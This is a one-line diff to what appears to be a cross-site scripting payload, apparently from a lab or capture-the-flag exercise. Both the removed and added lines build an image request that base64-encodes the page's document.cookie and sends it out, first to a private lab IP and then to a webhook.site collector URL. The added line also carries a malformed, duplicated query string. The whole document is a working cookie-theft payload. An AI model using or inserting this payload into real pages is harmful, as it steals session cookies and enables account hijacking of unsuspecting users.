@@ -1,1 +1,1 @@
- x = new Image(); x.src = 'http://10.10.14.17?data=' + encodeURIComponent(btoa(document.cookie));
+ x = new Image(); x.src = 'https://webhook.site/d821eaac-1c7f-4dd5-b1bd-5db195c2cd18?data?data=' + encodeURIComponent(btoa(document.cookie));
